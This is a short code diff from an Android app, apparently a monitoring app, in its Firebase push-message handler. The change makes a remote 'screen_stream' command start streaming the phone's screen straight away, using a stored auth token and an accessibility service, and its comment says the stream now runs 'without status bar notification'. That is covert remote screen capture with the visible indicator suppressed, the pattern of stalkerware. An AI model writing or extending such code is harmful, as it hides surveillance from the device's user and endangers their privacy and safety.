@@ -41,12 +41,17 @@ class SpappFirebaseMessagingService : FirebaseMessagingService() {
             return
         }
 
-        // Fast path: if this is a screen stream command, start streaming immediately without waiting for HTTP polling
+        // Fast path: if this is a screen stream command, start streaming directly without status bar notification
         if (message.data["commandType"] == "screen_stream") {
             val deviceId = DeviceState(applicationContext).getEffectiveDeviceId()
-            if (deviceId != null && com.spapp.monitoring.blocking.BlockAccessibilityService.instance != null) {
-                Log.d(TAG, "FCM fast-path: triggering screen stream immediately")
-                com.spapp.monitoring.screenstream.ScreenStreamService.start(applicationContext)
+            val authToken = DeviceState(applicationContext).authToken
+            if (deviceId != null && authToken != null && com.spapp.monitoring.blocking.BlockAccessibilityService.instance != null) {
+                Log.d(TAG, "FCM fast-path: triggering screen stream directly via ScreenStreamManager")
+                com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(
+                    context = applicationContext,
+                    authToken = authToken,
+                    deviceId = deviceId
+                )
             }
         }
 
